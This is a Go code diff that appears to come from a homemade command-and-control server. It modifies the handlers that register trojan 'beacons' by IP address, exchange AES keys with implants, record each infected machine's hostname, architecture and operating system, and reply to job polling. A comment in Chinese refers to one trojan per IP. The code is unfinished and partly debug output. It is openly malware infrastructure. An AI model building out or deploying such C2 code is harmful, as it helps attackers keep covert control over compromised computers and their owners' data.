@@ -2,15 +2,19 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"math/big"
+	"net"
 	"net/http"
 	"reflect"
 )
 
-func GET_handler(cookie string, listener *Listener) ([]byte, bool) {
+func GET_handler(cookie string, listener *Listener, r *http.Request) ([]byte, bool) {
 	var res []byte
 	cookie_decode, err := base64.StdEncoding.DecodeString(cookie)
+	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
+
 	aAES := getAES(listener.A)
 
 	if err != nil {
@@ -21,6 +25,13 @@ func GET_handler(cookie string, listener *Listener) ([]byte, bool) {
 
 		return res, false
 	} else if reflect.DeepEqual(listener.A, aAES.DecryptData(cookie_decode)) {
+		if Check_Beacon_ip(listener, ip) {
+			removeBeaconByIP(listener, ip) //暂时只考虑一个ip一个木马的情况
+			Create_beacon_1(listener, ip)
+		} else {
+			Create_beacon_1(listener, ip)
+		}
+
 		fmt.Println("AESa had match")
 		return res, true
 	} else {
@@ -29,45 +40,83 @@ func GET_handler(cookie string, listener *Listener) ([]byte, bool) {
 	}
 }
 
-func POST_handler(body []byte, listener *Listener, r *http.Request) []byte {
+func POST_handler(body []byte, listener *Listener, r *http.Request) ([]byte, bool) {
 
 	var res []byte
-	ip := r.RemoteAddr
+	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
 	domain := r.Host
 
-	if len(body) == 16 {
-		var CusAes big.Int
-		CusAes.SetBytes(GetBytes(body, 16))
+	println("1")
 
-		if Check_Beacon_CusAES(listener, CusAes) {
-			fmt.Println("have the beacon")
-			return res
-		} else {
+	for i, beacon := range listener.Beacons {
+		if beacon.Ip == ip && beacon.AESkey == "" && beacon.Arch == "" {
+
+			println("2")
+
+			var CusAes big.Int
+			CusAes.SetBytes(GetBytes(body, 16))
+
+			printkey(CusAes.Bytes())
+			CusAes = *Bytes_To_BigInt(ReverseBytes(CusAes.Bytes()))
+			printkey(CusAes.Bytes())
+
 			Srvkey := Random_Big_Int128()
-			//SrvAes := Big_Int_Pow(Bytes_To_BigInt(listener.A), Srvkey)
-			aeskey := Mod_Pow(&CusAes, Srvkey)
+			Create_beacon_2(listener, &CusAes, Srvkey, ip, domain, i)
+			SrvAes := Mod_Pow(Bytes_To_BigInt(listener.A), Srvkey)
 
-			newBeacon := Beacon{
-				Hostname: "",
-				Ip:       ip,
-				Domin:    domain,
-				Arch:     "",
-				System:   "",
-				CusAES:   CusAes.String(),
-				AESkey:   (*aeskey).String(),
-				Live:     true,
+			printkey(SrvAes.Bytes())
+			SrvAes = Bytes_To_BigInt(ReverseBytes(SrvAes.Bytes()))
+			printkey(SrvAes.Bytes())
+
+			res = append(res, SrvAes.Bytes()...)
+			return res, true
+
+		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch == "" {
+			eAES := getAES(stringToBytes(beacon.AESkey))
+			json_byte := eAES.DecryptData(GetBytes(body, len(body)))
+
+			var beacon_tmp Beacon
+
+			err := json.Unmarshal(json_byte, &beacon_tmp)
+			if err != nil {
+				fmt.Println("Error:", err)
 			}
-			listener.Beacons = append(listener.Beacons, newBeacon)
-			saveXML("./Listener/"+listener.Lisname, listener)
-		}
 
+			listener.Beacons[i].Hostname = beacon_tmp.Hostname
+			listener.Beacons[i].Arch = beacon_tmp.Arch
+			listener.Beacons[i].System = beacon_tmp.System
+
+			println("saving xml")
+			ModifyBeacons("./Listener/"+listener.Lisname, listener.Beacons)
+
+			return res, true
+
+		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch != "" {
+			eAES := getAES(stringToBytes(beacon.AESkey))
+			json_byte := eAES.DecryptData(GetBytes(body, len(body)))
+			if json_byte == nil {
+				if is_jobs_null(listener, i) {
+					return res, true // sleep
+				} else {
+
+				}
+			} else {
+
+				return res, true // commit
+			}
+
+		} else {
+			continue
+		}
 	}
-	return res
+	return res, false
+
 }
 
-func printkey(key []uint8) {
+func printkey(key []byte) {
+	fmt.Printf("\n ")
 	for _, b := range key {
-		fmt.Printf("%x ", b)
+		fmt.Printf("%02x ", b)
 	}
 }
 
@@ -79,4 +128,32 @@ func GetBytes(data []byte, length int) []byte {
 	res = data[:length]
 	data = data[length:]
 	return res
+}
+
+func stringToBytes(s string) []byte {
+	num := new(big.Int)
+	_, ok := num.SetString(s, 10)
+	if !ok {
+		return nil
+	}
+
+	byteSlice := num.Bytes()
+	return byteSlice
+}
+
+func ReverseBytes(data []byte) []byte {
+	reversed := make([]byte, len(data))
+	for i := 0; i < len(data); i++ {
+		reversed[len(data)-1-i] = data[i]
+	}
+	return reversed
+}
+
+func Debug_ip(listener *Listener, ip string) {
+	for _, b := range listener.Beacons {
+		if b.Ip == ip {
+			println(b.AESkey)
+		}
+	}
+
 }
